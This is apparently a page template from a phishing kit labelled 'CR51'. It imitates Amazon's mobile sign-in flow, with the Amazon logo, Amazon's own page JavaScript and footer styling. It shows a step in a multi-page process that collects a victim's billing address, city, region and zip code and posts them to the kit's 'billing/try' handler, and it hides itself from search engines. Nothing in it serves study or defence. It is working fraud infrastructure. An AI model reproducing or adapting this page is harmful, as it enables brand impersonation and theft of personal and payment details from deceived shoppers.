<?php
defined("ALLOW") or exit('No direct script access allowed');
$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
if (_config('DOUBLEEMAIL') == 'on') {
    $url = base_url() . "oauth/first";
} else {
    $url = base_url() . "oauth/process";
}
?>
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.21.9-2022-06-01">

<head>
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta charset="utf-8">
    <meta name="robots" content="noindex, nofollow">
    <title dir="ltr"> <?php echo $_45 ?> </title>
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/boostrap.min.css" media="all">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/cr51.mstyle2.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/cr51.mstyle.css">
    <script>
        (function(f, h, Q, E) {
            function F(a) {
                u && u.tag && u.tag(q(":", "aui", a))
            }

            function v(a, b) {
                u && u.count && u.count("aui:" + a, 0 === b ? 0 : b || (u.count("aui:" + a) || 0) + 1)
            }

            function m(a) {
                try {
                    return a.test(navigator.userAgent)
                } catch (b) {
                    return !1
                }
            }

            function x(a, b, c) {
                a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent && a.attachEvent("on" + b, c)
            }

            function q(a, b, c, e) {
                b = b && c ? b + a + c : b || c;
                return e ? q(a, b, e) : b
            }

            function G(a, b, c) {
                try {
                    Object.defineProperty(a, b, {
                        value: c,
                        writable: !1
                    })
                } catch (e) {
                    a[b] = c
                }
                return c
            }

            function ua(a, b, c) {
                var e = c = a.length,
                    g = function() {
                        e-- || (R.push(b), S || (setTimeout(ca, 0), S = !0))
                    };
                for (g(); c--;) da[a[c]] ? g() : (z[a[c]] = z[a[c]] || []).push(g)
            }

            function va(a, b, c, e, g) {
                var d = h.createElement(a ? "script" : "link");
                x(d, "error", e);
                g && x(d, "load", g);
                a ? (d.type = "text/javascript", d.async = !0, c && /AUIClients|images[/]I/.test(b) && d.setAttribute("crossorigin", "anonymous"), d.src = b) : (d.rel = "stylesheet", d.href = b);
                h.getElementsByTagName("head")[0].appendChild(d)
            }

            function ea(a, b) {
                return function(c, e) {
                    function g() {
                        va(b, c, d, function(b) {
                            T ? v("resource_unload") : d ? (d = !1, v("resource_retry"), g()) : (v("resource_error"), a.log("Asset failed to load: " + c));
                            b && b.stopPropagation ? b.stopPropagation() : f.event && (f.event.cancelBubble = !0)
                        }, e)
                    }
                    if (fa[c]) return !1;
                    fa[c] = !0;
                    v("resource_count");
                    var d = !0;
                    return !g()
                }
            }

            function wa(a, b, c) {
                for (var e = {
                        name: a,
                        guard: function(c) {
                            return b.guardFatal(a, c)
                        },
                        guardTime: function(a) {
                            return b.guardTime(a)
                        },
                        logError: function(c, d, e) {
                            b.logError(c, d, e, a)
                        }
                    }, g = [], d = 0; d < c.length; d++) H.hasOwnProperty(c[d]) && (g[d] = U.hasOwnProperty(c[d]) ? U[c[d]](H[c[d]], e) : H[c[d]]);
                return g
            }

            function A(a, b, c, e, g) {
                return function(d, h) {
                    function n() {
                        var a = null;
                        e ? a = h : "function" === typeof h && (p.start = w(), a = h.apply(f, wa(d, k, l)), p.end = w());
                        if (b) {
                            H[d] = a;
                            a = d;
                            for (da[a] = !0;
                                (z[a] || []).length;) z[a].shift()();
                            delete z[a]
                        }
                        p.done = !0
                    }
                    var k = g || this;
                    "function" === typeof d && (h = d, d = E);
                    b && (d = d ? d.replace(ha, "") : "__NONAME__", V.hasOwnProperty(d) && k.error(q(", reregistered by ", q(" by ", d + " already registered", V[d]), k.attribution), d), V[d] = k.attribution);
                    for (var l = [], m = 0; m < a.length; m++) l[m] = a[m].replace(ha, "");
                    var p = B[d || "anon" + ++xa] = {
                        depend: l,
                        registered: w(),
                        namespace: k.namespace
                    };
                    d && ya.hasOwnProperty(d);
                    c ? n() : ua(l, k.guardFatal(d, n), d);
                    return {
                        decorate: function(a) {
                            U[d] = k.guardFatal(d, a)
                        }
                    }
                }
            }

            function ia(a) {
                return function() {
                    var b = Array.prototype.slice.call(arguments);
                    return {
                        execute: A(b, !1, a, !1, this),
                        register: A(b, !0, a, !1, this)
                    }
                }
            }

            function W(a, b) {
                return function(c, e) {
                    e || (e = c, c = E);
                    var g = this.attribution;
                    return function() {
                        t.push(b || {
                            attribution: g,
                            name: c,
                            logLevel: a
                        });
                        var d = e.apply(this, arguments);
                        t.pop();
                        return d
                    }
                }
            }

            function I(a, b) {
                this.load = {
                    js: ea(this, !0),
                    css: ea(this)
                };
                G(this, "namespace", b);
                G(this, "attribution", a)
            }

            function ja() {
                h.body ? r.trigger("a-bodyBegin") : setTimeout(ja, 20)
            }

            function C(a, b) {
                a.className = X(a, b) + " " + b
            }

            function X(a, b) {
                return (" " + a.className + " ").split(" " + b + " ").join(" ").replace(/^ | $/g, "")
            }

            function ka(a) {
                try {
                    return a()
                } catch (b) {
                    return !1
                }
            }

            function J() {
                if (K) {
                    var a = {
                        w: f.innerWidth || n.clientWidth,
                        h: f.innerHeight || n.clientHeight
                    };
                    5 < Math.abs(a.w - Y.w) || 50 < a.h - Y.h ? (Y = a, L = 4, (a = k.mobile || k.tablet ? 450 < a.w && a.w > a.h : 1250 <= a.w) ? C(n, "a-ws") : n.className = X(n, "a-ws")) : 0 < L && (L--, la = setTimeout(J, 16))
                }
            }

            function za(a) {
                (K = a === E ? !K : !!a) && J()
            }

            function Aa() {
                return K
            }

            function ma() {
                D.forEach(function(a) {
                    F(a)
                })
            }

            function na(a, b, c) {
                if (b) {
                    a = m(/Chrome/i) && !m(/Edge/i) && !m(/OPR/i) && !a.capabilities.isAmazonApp && !m(new RegExp(Z + "bwv" + Z + "b"));
                    var e = "sw:browser:" + c + ":";
                    b.browser && a && (D.push(e + "supported"), b.browser.action(e, c));
                    !a && b.browser && D.push(e + "unsupported")
                }
            }
            "use strict";
            var M = Q.now = Q.now || function() {
                    return +new Q
                },
                w = function(a) {
                    return a && a.now ? a.now.bind(a) : M
                }(f.performance),
                N = w(),
                ya = {},
                p = f.AmazonUIPageJS || f.P;
            if (p && p.when && p.register) {
                N = [];
                for (var l = h.currentScript; l; l = l.parentElement) l.id && N.push(l.id);
                return p.log("A copy of P has already been loaded on this page.", "FATAL", N.join(" "))
            }
            var u = f.ue;
            F();
            F("aui_build_date:3.21.9-2022-06-01");
            var R = [],
                Ba = [],
                S = !1;
            var ca = function() {
                for (var a = setTimeout(ca, 0), b = M(); Ba.length || R.length;)
                    if (R.shift()(), 50 < M() - b) return;
                clearTimeout(a);
                S = !1
            };
            var da = {},
                z = {},
                fa = {},
                T = !1;
            x(f, "beforeunload", function() {
                T = !0;
                setTimeout(function() {
                    T = !1
                }, 1E4)
            });
            var ha = /^prv:/,
                V = {},
                H = {},
                U = {},
                B = {},
                xa = 0,
                Z = String.fromCharCode(92),
                t = [],
                oa = !0,
                pa = f.onerror;
            f.onerror = function(a, b, c, e, g) {
                g && "object" === typeof g || (g = Error(a, b, c), g.columnNumber = e, g.stack = b || c || e ? q(Z, g.message, "at " + q(":", b, c, e)) : E);
                var d = t.pop() || {};
                g.attribution = q(":", g.attribution || d.attribution, d.name);
                g.logLevel = d.logLevel;
                g.attribution && console && console.log && console.log([g.logLevel || "ERROR", a, "thrown by", g.attribution].join(" "));
                t = [];
                pa && (d = [].slice.call(arguments), d[4] = g, pa.apply(f, d))
            };
            I.prototype = {
                logError: function(a, b, c, e) {
                    b = {
                        message: b,
                        logLevel: c || "ERROR",
                        attribution: q(":", this.attribution, e)
                    };
                    if (f.ueLogError) return f.ueLogError(a || b, a ? b : null), !0;
                    console && console.error && (console.log(b), console.error(a));
                    return !1
                },
                error: function(a, b, c, e) {
                    a = Error(q(":", e, a, c));
                    a.attribution = q(":", this.attribution, b);
                    throw a;
                },
                guardError: W(),
                guardFatal: W("FATAL"),
                guardCurrent: function(a) {
                    var b = t[t.length - 1];
                    return b ? W(b.logLevel, b).call(this, a) : a
                },
                guardTime: function(a) {
                    var b = t[t.length - 1],
                        c = b && b.name;
                    return c && c in B ? function() {
                        var b = w(),
                            g = a.apply(this, arguments);
                        B[c].async = (B[c].async || 0) + w() - b;
                        return g
                    } : a
                },
                log: function(a, b, c) {
                    return this.logError(null, a, b, c)
                },
                declare: A([], !0, !0, !0),
                register: A([], !0),
                execute: A([]),
                AUI_BUILD_DATE: "3.21.9-2022-06-01",
                when: ia(),
                now: ia(!0),
                trigger: function(a, b, c) {
                    var e = M();
                    this.declare(a, {
                        data: b,
                        pageElapsedTime: e - (f.aPageStart || NaN),
                        triggerTime: e
                    });
                    c && c.instrument && O.when("prv:a-logTrigger").execute(function(b) {
                        b(a)
                    })
                },
                handleTriggers: function() {
                    this.log("handleTriggers deprecated")
                },
                attributeErrors: function(a) {
                    return new I(a)
                },
                _namespace: function(a, b) {
                    return new I(a, b)
                },
                setPriority: function(a) {
                    oa ? oa = !1 : this.log("setPriority only accept the first call.")
                }
            };
            var r = G(f, "AmazonUIPageJS", new I);
            var O = r._namespace("PageJS", "AmazonUI");
            O.declare("prv:p-debug", B);
            r.declare("p-recorder-events", []);
            r.declare("p-recorder-stop", function() {});
            G(f, "P", r);
            ja();
            if (h.addEventListener) {
                var qa;
                h.addEventListener("DOMContentLoaded", qa = function() {
                    r.trigger("a-domready");
                    h.removeEventListener("DOMContentLoaded", qa, !1)
                }, !1)
            }
            var n = h.documentElement,
                aa = function() {
                    var a = ["O", "ms", "Moz", "Webkit"],
                        b = h.createElement("div");
                    return {
                        testGradients: function() {
                            return !0
                        },
                        test: function(c) {
                            var e = c.charAt(0).toUpperCase() + c.substr(1);
                            c = (a.join(e + " ") + e + " " + c).split(" ");
                            for (e = c.length; e--;)
                                if ("" === b.style[c[e]]) return !0;
                            return !1
                        },
                        testTransform3d: function() {
                            return !0
                        }
                    }
                }();
            p = n.className;
            var ra = /(^| )a-mobile( |$)/.test(p),
                sa = /(^| )a-tablet( |$)/.test(p),
                k = {
                    audio: function() {
                        return !!h.createElement("audio").canPlayType
                    },
                    video: function() {
                        return !!h.createElement("video").canPlayType
                    },
                    canvas: function() {
                        return !!h.createElement("canvas").getContext
                    },
                    svg: function() {
                        return !!h.createElementNS && !!h.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGRect
                    },
                    offline: function() {
                        return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine
                    },
                    dragDrop: function() {
                        return "draggable" in h.createElement("span")
                    },
                    geolocation: function() {
                        return !!navigator.geolocation
                    },
                    history: function() {
                        return !(!f.history || !f.history.pushState)
                    },
                    webworker: function() {
                        return !!f.Worker
                    },
                    autofocus: function() {
                        return "autofocus" in h.createElement("input")
                    },
                    inputPlaceholder: function() {
                        return "placeholder" in h.createElement("input")
                    },
                    textareaPlaceholder: function() {
                        return "placeholder" in h.createElement("textarea")
                    },
                    localStorage: function() {
                        return "localStorage" in f && null !== f.localStorage
                    },
                    orientation: function() {
                        return "orientation" in f
                    },
                    touch: function() {
                        return "ontouchend" in h
                    },
                    gradients: function() {
                        return aa.testGradients()
                    },
                    hires: function() {
                        var a = f.devicePixelRatio && 1.5 <= f.devicePixelRatio || f.matchMedia && f.matchMedia("(min-resolution:144dpi)").matches;
                        v("hiRes" + (ra ? "Mobile" : sa ? "Tablet" : "Desktop"), a ? 1 : 0);
                        return a
                    },
                    transform3d: function() {
                        return aa.testTransform3d()
                    },
                    touchScrolling: function() {
                        return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|SOFTWARE=([5-9]|[1-9][0-9]+)(.[0-9]{1,2})+.*DEVICE=iPhone|Chrome|Silk|Firefox|Trident.+?; Touch/i)
                    },
                    ios: function() {
                        return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i) && !m(/trident|Edge/i)
                    },
                    android: function() {
                        return m(/android.([1-9]|[L-Z])/i) && !m(/trident|Edge/i)
                    },
                    mobile: function() {
                        return ra
                    },
                    tablet: function() {
                        return sa
                    },
                    rtl: function() {
                        return "rtl" === n.dir
                    }
                };
            for (l in k) k.hasOwnProperty(l) && (k[l] = ka(k[l]));
            for (var ba = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), P = 0; P < ba.length; P++) k[ba[P]] = ka(function() {
                return aa.test(ba[P])
            });
            var K = !0,
                la = 0,
                Y = {
                    w: 0,
                    h: 0
                },
                L = 4;
            J();
            x(f, "resize", function() {
                clearTimeout(la);
                L = 4;
                J()
            });
            var ta = {
                getItem: function(a) {
                    try {
                        return f.localStorage.getItem(a)
                    } catch (b) {}
                },
                setItem: function(a, b) {
                    try {
                        return f.localStorage.setItem(a, b)
                    } catch (c) {}
                }
            };
            n.className = X(n, "a-no-js");
            C(n, "a-js");
            !m(/OS [1-8](_[0-9]*)+ like Mac OS X/i) || f.navigator.standalone || m(/safari/i) || C(n, "a-ember");
            p = [];
            for (l in k) k.hasOwnProperty(l) && k[l] && p.push("a-" + l.replace(/([A-Z])/g, function(a) {
                return "-" + a.toLowerCase()
            }));
            C(n, p.join(" "));
            n.setAttribute("data-aui-build-date", "3.21.9-2022-06-01");
            r.register("p-detect", function() {
                return {
                    capabilities: k,
                    localStorage: k.localStorage && ta,
                    toggleResponsiveGrid: za,
                    responsiveGridEnabled: Aa
                }
            });
            m(/UCBrowser/i) || k.localStorage && C(n, ta.getItem("a-font-class"));
            r.declare("a-event-revised-handling", !1);
            try {
                var y = navigator.serviceWorker
            } catch (a) {
                F("sw:nav_err")
            }
            y && (x(y, "message", function(a) {
                a && a.data && v(a.data.k, a.data.v)
            }), y.controller && y.controller.postMessage("MSG-RDY"));
            var D = [];
            (function(a) {
                var b = a.reg,
                    c = a.unreg;
                y && y.getRegistrations ? (O.when("A").execute(function(a) {
                    na(a, c, "unregister")
                }), x(f, "load", function() {
                    O.when("A").execute(function(a) {
                        na(a, b, "register");
                        ma()
                    })
                })) : (b && b.browser && D.push("sw:browser:register:unsupported"), c && c.browser && D.push("sw:browser:unregister:unsupported"), ma())
            })({
                reg: {},
                unreg: {}
            });
            r.declare("a-fix-event-off", !1);
            v("pagejs:pkgExecTime", w() - N)
        })(window, document, Date);
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('<?= base_url() ?>CR51/Assets/_hayo/js/cr51.jsku.js');
    </script>
    <style>
        #aa-challenge-whole-page-iframe {
            overflow: hidden;
            opacity: 1.0;
            position: fixed;
            top: 0px;
            bottom: 0px;
            right: 0px;
            border: none;
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            z-index: 999999;
        }
    </style>
</head>

<body class="a-color-offset-background a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_launch_2021_ally_fixes_392482-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">
    <div id="a-page">
        <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
        <div class="a-section a-spacing-none">
            <div class="a-container a-global-nav-wrapper">
                <div class="a-section a-spacing-none a-text-center">
                    <a class="a-link-nav-icon" tabindex="-1" href="#">
                        <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </a>
                </div>
            </div>
        </div>
        <div id="authportal-center-section" class="a-section">
            <ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
                <li>
                    <?php echo $_113 ?>
                </li>
                <li class="is-active">
                    <?php echo $_46 ?>
                </li>
                <li>
                    <?php echo $_47 ?>
                </li>
                <li>
                    <?php echo $_48 ?>
                </li>
            </ul><br>
            <div class="a-container">
                <div class="a-section a-spacing-none"></div>
                <div class="a-section a-spacing-none auth-pagelet-mobile-container"></div>
                <div class="a-section auth-pagelet-mobile-container">
                    <div class="a-section a-spacing-extra-large">
                        <h1 class="a-spacing-mini"> <?php echo $_71 ?> </h1>
                        <p> <?php echo $_72 ?> </p>
                        <form action="<?= base_url() ?>billing/try" method="post">
                            <label for="ap_address" aria-hidden="true" class="a-form-label"> <?php echo $_74 ?> </label>
                            <div class="a-section a-spacing-base">
                                <div class="a-input-text-wrapper">
                                    <input type="text" name="address" id="adressline1" placeholder="<?php echo $_75 ?>" minlength="5" maxlength="30" onkeypress="return alpha(event)" required>
                                </div>
                            </div>
                            <label for="ap_cityp" aria-hidden="true" class="a-form-label"> <?php echo $_76 ?> </label>
                            <div class="a-section a-spacing-base">
                                <div class="a-input-text-wrapper">
                                    <input type="text" id="cityp" name="cityp" placeholder="<?php echo $_76 ?>" maxlength="25" onkeypress="return alpha(event)" required>
                                </div>
                            </div>
                            <label for="ap_ssn" aria-hidden="true" class="a-form-label"> <?php echo $_77 ?> </label>
                            <div class="a-section a-spacing-base">
                                <div class="a-input-text-wrapper">
                                    <input type="text" name="region" id="region" placeholder="<?php echo $_77 ?>" maxlength="30" onkeypress="return alpha(event)" required>
                                </div>
                            </div>
                            <label for="ap_phone" aria-hidden="true" class="a-form-label"> <?php echo $_78 ?> </label>
                            <div class="a-section a-spacing-base">
                                <div class="a-input-text-wrapper">
                                    <input type="text" name="zipcode" id="zipCode" placeholder="<?php echo $_79 ?>" maxlength="12" required>
                                </div>
                            </div>
                            <div class="a-row"></div>
                            <div class="a-button-stack">
                                <span class="a-button a-button-primary">
                                    <span class="a-button-inner">
                                        <button type="submit" name="Sex" class="a-button-text" role="button"><?php echo $_7 ?></button>
                                    </span>
                                </span>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="a-row auth-footer">
        <style>
            .auth-footer-separator {
                display: inline-block;
                width: 20px;
            }
        </style>
        <div class="a-divider a-divider-section">
            <div class="a-divider-inner"></div>
        </div>
        <div id="footer" class="a-section">
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-separator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener" href="#"> <?php echo $_21 ?> </a>
                <span class="auth-footer-separator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener" href="#"> <?php echo $_22 ?> </a>
                <span class="auth-footer-separator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener" href="#"> <?php echo $_23 ?> </a>
                <span class="auth-footer-separator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center">
                <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span>
            </div>
        </div>
    </div>
    </div>
    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
    <div id="a-white"></div>
</body>

</html>